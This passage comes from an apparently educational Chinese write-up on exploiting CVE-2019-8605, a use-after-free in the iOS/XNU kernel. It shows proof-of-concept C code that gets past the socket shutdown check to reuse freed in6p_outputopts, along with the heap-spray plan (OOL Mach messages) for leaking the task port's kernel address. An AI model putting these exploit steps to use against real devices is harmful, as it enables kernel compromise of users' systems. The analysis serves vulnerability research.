        setsockopt(tcp_sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));
        // 释放in6p_outputopts
        disconnectx(tcp_sock, 0, 0);
        int ret = setsockopt(tcp_sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));
        if (ret) {
            printf("[-] setsockopt() failed, error %d (%s)\n", errno, strerror(errno));
            return -1;
        }
    }
显然是不能的
    [-] setsockopt() failed, error 22 (Invalid argument)
因为在函数`sosetoptlock()`有一个检查，如果发现Socket已经被关闭，就直接失败
    #define    SS_CANTRCVMORE        0x0020    /* can't receive more data from peer */
    #define    SS_CANTSENDMORE        0x0010    /* can't send more data to peer */
    #define    SOF_NPX_SETOPTSHUT    0x00002000 /* Non POSIX extension to allow
    int
    sosetoptlock(struct socket *so, struct sockopt *sopt, int dolock)
    {
        ...
        if ((so->so_state & (SS_CANTRCVMORE | SS_CANTSENDMORE)) ==
            (SS_CANTRCVMORE | SS_CANTSENDMORE) &&
            (so->so_flags & SOF_NPX_SETOPTSHUT) == 0) {
            /* the socket has been shutdown, no more sockopt's */
            error = EINVAL;
            goto out;
        }
        ...
理解一下这个检查，左边`so->so_state`只能是`SS_CANTRCVMORE`与`SS_CANTSENDMORE`之间任意一种且右边`so->so_flags`不能是`SOF_NPX_SETOPTSHUT`，就会跳到`goto
out`
    (so->so_state & (SS_CANTRCVMORE | SS_CANTSENDMORE)) == (SS_CANTRCVMORE | SS_CANTSENDMORE) 
    && (so->so_flags & SOF_NPX_SETOPTSHUT) == 0
但是天无绝人之路，看下面这个宏，允许在关闭Socket之后使用函数`setsockopt`
    #define    SONPX_SETOPTSHUT    0x000000001    /* flag for allowing setsockopt after shutdown */
找到这个宏的使用场景，发现是在`level`为`SOL_SOCKET`的分支里，当满足`sonpx.npx_mask`和`sonpx.npx_flags`都为`SONPX_SETOPTSHUT`时，就会给`so->so_flags`添加`SOF_NPX_SETOPTSHUT`标志位
    int
    sosetoptlock(struct socket *so, struct sockopt *sopt, int dolock)
    {
        ...
        if (sopt->sopt_level != SOL_SOCKET) {
            ...
        } else {
            ...
            switch (sopt->sopt_name) {
            ...
            case SO_NP_EXTENSIONS: {
                struct so_np_extensions sonpx;
                error = sooptcopyin(sopt, &sonpx, sizeof (sonpx),
                    sizeof (sonpx));
                if (error != 0)
                    goto out;
                if (sonpx.npx_mask & ~SONPX_MASK_VALID) {
                    error = EINVAL;
                    goto out;
                }
                /*
                 * Only one bit defined for now
                 */
                if ((sonpx.npx_mask & SONPX_SETOPTSHUT)) {
                    if ((sonpx.npx_flags & SONPX_SETOPTSHUT))
                        so->so_flags |= SOF_NPX_SETOPTSHUT;    // 添加标志位
                    else
                        so->so_flags &= ~SOF_NPX_SETOPTSHUT;
                }
                break;
            }
当`so->so_flags`拥有`SOF_NPX_SETOPTSHUT`标志位，那么右边的检查就不能成立，成功绕过
    (so->so_state & (SS_CANTRCVMORE | SS_CANTSENDMORE)) == (SS_CANTRCVMORE | SS_CANTSENDMORE) 
    && (so->so_flags & SOF_NPX_SETOPTSHUT) == 0
此时的代码如下
    int main(int argc, char * argv[]) {
        int tcp_sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
        int minmtu = -1;
        setsockopt(tcp_sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));
        struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
        setsockopt(tcp_sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
        disconnectx(tcp_sock, 0, 0);
        minmtu = 1;
        ret = setsockopt(tcp_sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));
        if (ret) {
            printf("[-] setsockopt() failed, error %d (%s)\n", errno, strerror(errno));
            return -1;
        }
        int mtu;
        get_minmtu(tcp_sock, &mtu);
        NSLog(@"%d\n", mtu);
        return UIApplicationMain(argc, argv, nil, appDelegateClassName);
    }
相当成功
    2021-01-20 00:26:04.136672+0800 CVE-2019-8605-iOS[650:238743] 1
## 4\. 泄露Task Port内核态地址
UAF漏洞常规利用方案是堆喷分配到先前释放掉的空间，这样我们拥有的指针指向的空间数据就可控，接下来尝试泄露一个地址
按照Ned Williamson的思路来分析利用方案，以下的分析顺序并非按照Exp的顺序进行，大家可自行对照
  * [https://bugs.chromium.org/p/project-zero/issues/attachment?aid=403533&signed_aid=-2cO9Y7SDzmQNv1CHt6J3w==](https://bugs.chromium.org/p/project-zero/issues/attachment?aid=403533&signed_aid=-2cO9Y7SDzmQNv1CHt6J3w==)
那么我们泄露什么地址呢？
答案是：`Task Port`
为了解释说明什么是`Task Port`以及获取`Task Port`能干什么，这里先介绍XNU的Task
Task是资源的容器，封装了虚拟地址空间，处理器资源，调度控制等，对应的结构体如下，重点注意其中的`IPC structures`部分
    struct task {
        /* Synchronization/destruction information */
        decl_lck_mtx_data(,lock)        /* Task's lock */
        _Atomic uint32_t    ref_count;    /* Number of references to me */
        boolean_t    active;        /* Task has not been terminated */
        boolean_t    halting;    /* Task is being halted */
        /* Virtual timers */
        uint32_t        vtimers;
        /* Miscellaneous */
        vm_map_t    map;        /* Address space description */
        queue_chain_t    tasks;    /* global list of tasks */
        /* Threads in this task */
        queue_head_t        threads;
        ...
        /* IPC structures */
        decl_lck_mtx_data(,itk_lock_data)
        struct ipc_port *itk_self;    /* not a right, doesn't hold ref */
        struct ipc_port *itk_nself;    /* not a right, doesn't hold ref */
        struct ipc_port *itk_sself;    /* a send right */
        struct exception_action exc_actions[EXC_TYPES_COUNT];
                         /* a send right each valid element  */
        struct ipc_port *itk_host;    /* a send right */
        struct ipc_port *itk_bootstrap;    /* a send right */
        struct ipc_port *itk_seatbelt;    /* a send right */
        struct ipc_port *itk_gssd;    /* yet another send right */
        struct ipc_port *itk_debug_control; /* send right for debugmode communications */
        struct ipc_port *itk_task_access; /* and another send right */ 
        struct ipc_port *itk_resume;    /* a receive right to resume this task */
        struct ipc_port *itk_registered[TASK_PORT_REGISTER_MAX];
                        /* all send rights */
        struct ipc_space *itk_space;
        ...
    };
简单来说，`Task
Port`是任务本身的Port，使用`mach_task_self`或`mach_task_self()`都可以获取到它，我可以利用它做很多事情，下面利用代码中的函数`find_port_via_uaf()`第一个参数就是通过调用函数`mach_task_self()`获取的
泄露`Task Port`的流程如下
    self_port_addr = task_self_addr(); // port leak primitive
这里还用到了缓存机制
    uint64_t task_self_addr() {
        static uint64_t cached_task_self_addr = 0;
        // 判断是否获取过Task Port地址
        if (cached_task_self_addr)
            return cached_task_self_addr;   // 返回缓存的Task Port地址
        else
            return find_port_via_uaf(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
    }
先获取一个存在漏洞的Socket，然后填充释放掉的内存并利用`inp->in6p_outputopts`读取数据
    uint64_t find_port_via_uaf(mach_port_t port, int disposition) {
        int sock = get_socket_with_dangling_options();
        // 填充释放掉的内存并利用inp->in6p_outputopts读取数据
            ...
        close(sock);
        return 0;
    }
**这里不直接填充数据是因为Port在用户态和内核态表现形式不一样，我们不能盲目直接把Port填充进去**
在用户态，Port是一个无符号整形
    typedef __darwin_mach_port_t mach_port_t;
    typedef __darwin_mach_port_name_t __darwin_mach_port_t; /* Used by mach */
    typedef __darwin_natural_t __darwin_mach_port_name_t; /* Used by mach */
    typedef unsigned int        __darwin_natural_t;
在内核态，Port可是一个结构体`ipc_port`
    struct ipc_port {
        /*
         * Initial sub-structure in common with ipc_pset
         * First element is an ipc_object second is a
         * message queue
         */
        struct ipc_object ip_object;
        struct ipc_mqueue ip_messages;
        union {
            struct ipc_space *receiver;
            struct ipc_port *destination;
            ipc_port_timestamp_t timestamp;
        } data;
        union {
            ipc_kobject_t kobject;
            ipc_importance_task_t imp_task;
            ipc_port_t sync_inheritor_port;
            struct knote *sync_inheritor_knote;
            struct turnstile *sync_inheritor_ts;
        } kdata;
        struct ipc_port *ip_nsrequest;
        struct ipc_port *ip_pdrequest;
        struct ipc_port_request *ip_requests;
        union {
            struct ipc_kmsg *premsg;
            struct turnstile *send_turnstile;
            SLIST_ENTRY(ipc_port) dealloc_elm;
        } kdata2;
        mach_vm_address_t ip_context;
        natural_t ip_sprequests:1,    /* send-possible requests outstanding */
              ip_spimportant:1,    /* ... at least one is importance donating */
              ip_impdonation:1,    /* port supports importance donation */
              ip_tempowner:1,    /* dont give donations to current receiver */
              ip_guarded:1,         /* port guarded (use context value as guard) */
              ip_strict_guard:1,    /* Strict guarding; Prevents user manipulation of context values directly */
              ip_specialreply:1,    /* port is a special reply port */
              ip_sync_link_state:3,    /* link the special reply port to destination port/ Workloop */
              ip_impcount:22;    /* number of importance donations in nested queue */
        mach_port_mscount_t ip_mscount;
        mach_port_rights_t ip_srights;
        mach_port_rights_t ip_sorights;
    #if    MACH_ASSERT
    #define    IP_NSPARES        4
    #define    IP_CALLSTACK_MAX    16
    /*    queue_chain_t    ip_port_links;*//* all allocated ports */
        thread_t    ip_thread;    /* who made me?  thread context */
        unsigned long    ip_timetrack;    /* give an idea of "when" created */
        uintptr_t    ip_callstack[IP_CALLSTACK_MAX]; /* stack trace */
        unsigned long    ip_spares[IP_NSPARES]; /* for debugging */
    #endif    /* MACH_ASSERT */
    #if DEVELOPMENT || DEBUG
        uint8_t        ip_srp_lost_link:1,    /* special reply port turnstile link chain broken */
                ip_srp_msg_sent:1;    /* special reply port msg sent */
    #endif
    };
那怎么把它的内核态地址分配到`inp->in6p_outputopts`呢？
答案是：使用`OOL Message`
`OOL
Message`定义如下，结构体`mach_msg_ool_ports_descriptor_t`用于在一条消息里以Port数组的形式发送多个`Mach
Port`
    struct ool_msg  {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_ports;
    };
为什么要使用`OOL Message`作为填充对象，我们可以从源码中找到答案
Mach Message的接收与发送依赖函数`mach_msg()`进行，这个函数在用户态与内核态均有实现
我们跟入函数`mach_msg()`，函数`mach_msg()`会调用函数`mach_msg_trap()`，函数`mach_msg_trap()`会调用函数`mach_msg_overwrite_trap()`
    mach_msg_return_t
    mach_msg_trap(
        struct mach_msg_overwrite_trap_args *args)
    {
        kern_return_t kr;
        args->rcv_msg = (mach_vm_address_t)0;
        kr = mach_msg_overwrite_trap(args);
        return kr;
    }
当函数`mach_msg()`第二个参数是`MACH_SEND_MSG`的时候，函数`ipc_kmsg_get()`用于分配缓冲区并从用户态拷贝数据到内核态
    mach_msg_return_t
    mach_msg_overwrite_trap(
        struct mach_msg_overwrite_trap_args *args)
    {
        mach_vm_address_t       msg_addr = args->msg;
        mach_msg_option_t       option = args->option;  // mach_msg()第二个参数
        ...
        mach_msg_return_t  mr = MACH_MSG_SUCCESS; // 大吉大利
        vm_map_t map = current_map();
        /* Only accept options allowed by the user */
        option &= MACH_MSG_OPTION_USER;